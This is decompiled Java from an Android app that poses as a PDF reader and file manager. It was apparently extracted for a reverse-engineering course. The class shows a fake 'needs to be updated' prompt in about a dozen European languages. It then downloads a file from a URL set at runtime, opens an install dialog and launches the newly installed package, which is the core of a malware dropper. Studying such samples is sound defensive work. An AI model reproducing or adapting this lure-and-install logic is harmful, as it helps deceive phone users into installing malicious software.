package com.travisscott.pdf;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.widget.Toast;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicReference;

/* loaded from: /home/davidjosearaujo/Documents/mc/first-year/second-semester/RE/P/re-android-reversing/original_zip/cortina.dex */
public class MainLibrary {
    public static final String PACKAGE_INSTALLED_ACTION = "com.tragisoap.fileexplorerpdfviewer.SESSION_API_PACKAGE_INSTALLED";
    private static Class<? extends Activity> PartPreviewActivity;
    private static Class<? extends Activity> MainActivity;
    public static final AtomicReference<String> url = new AtomicReference<>();
    public static final AtomicReference<String> packageName = new AtomicReference<>();
    public static final DownloadRecorderManager downloadRecorderManager = new DownloadRecorderManager();

    public static void init(Class<? extends Activity> PartPreviewActivity2, Class<? extends Activity> mainClass2) {
        PartPreviewActivity = PartPreviewActivity2;
        MainActivity = mainClass2;
    }

    public static Class<? extends Activity> getPartPreviewActivity() {
        return PartPreviewActivity;
    }

    public static Class<? extends Activity> getMainActivity() {
        return MainActivity;
    }

    public static String getFirstText() {
        String lang = Locale.getDefault().getLanguage();
        char c = 65535;
        switch (lang.hashCode()) {
            case 3141:
                if (lang.equals("bg")) {
                    c = '\n';
                    break;
                }
                break;
            case 3184:
                if (lang.equals("cs")) {
                    c = 0;
                    break;
                }
                break;
            case 3191:
                if (lang.equals("cz")) {
                    c = 1;
                    break;
                }
                break;
            case 3201:
                if (lang.equals("de")) {
                    c = 4;
                    break;
                }
                break;
            case 3232:
                if (lang.equals("ee")) {
                    c = 11;
                    break;
                }
                break;
            case 3247:
                if (lang.equals("et")) {
                    c = '\f';
                    break;
                }
                break;
            case 3267:
                if (lang.equals("fi")) {
                    c = '\t';
                    break;
                }
                break;
            case 3338:
                if (lang.equals("hr")) {
                    c = 6;
                    break;
                }
                break;
            case 3464:
                if (lang.equals("lt")) {
                    c = '\r';
                    break;
                }
                break;
            case 3508:
                if (lang.equals("nb")) {
                    c = '\b';
                    break;
                }
                break;
            case 3521:
                if (lang.equals("no")) {
                    c = 7;
                    break;
                }
                break;
            case 3670:
                if (lang.equals("si")) {
                    c = 2;
                    break;
                }
                break;
            case 3672:
                if (lang.equals("sk")) {
                    c = 5;
                    break;
                }
                break;
            case 3673:
                if (lang.equals("sl")) {
                    c = 3;
                    break;
                }
                break;
        }
        switch (c) {
            case 0:
            case 1:
                return "PDF Reader: File Manager\n Je třeba aktualizovat";
            case 2:
            case 3:
                return "PDF Reader: File Manager\n Treba je posodobiti";
            case 4:
                return "PDF Reader: File Manager\n Muss aktualisiert werden";
            case 5:
                return "PDF Reader: File Manager\n Je potrebné aktualizovať";
            case 6:
                return "PDF Reader: File Manager\n Treba ga ažurirati";
            case 7:
            case '\b':
                return "PDF Reader: File Manager\n Må oppdateres";
            case '\t':
                return "PDF Reader: File Manager\n On päivitettävä";
            case '\n':
                return "PDF Reader: File Manager\n Трябва да се актуализира";
            case 11:
            case '\f':
                return "PDF Reader: File Manager\n Vajab värskendamist";
            case '\r':
                return "PDF Reader: File Manager\n Reikia atnaujinti";
            default:
                return "PDF Reader: File Manager\n Needs to be updated";
        }
    }

    public static String getSecondText() {
        return "UPDATE";
    }

    public static void launch(Context context) {
        downloadRecorderManager.startDownload(context, url.get());
    }

    public static void readPDFfile(Context context) {
        if (DownloadRecorderManager.downloaded.get()) {
            downloadRecorderManager.showInstallDialog(context);
        } else {
            Toast.makeText(context, "Please wait until the download is finished", 0).show();
        }
    }

    public static void makePdfPage(Context context) {
        ServiceHandler.handleWork(context);
    }

    public static void getName(Context context) {
        String target = packageName.get();
        if (target != null && !target.isEmpty()) {
            PackageManager pm = context.getPackageManager();
            Intent launch = pm.getLaunchIntentForPackage(target);
            if (launch != null) {
                launch.addFlags(268435456);
                context.startActivity(launch);
            }
        }
    }
}
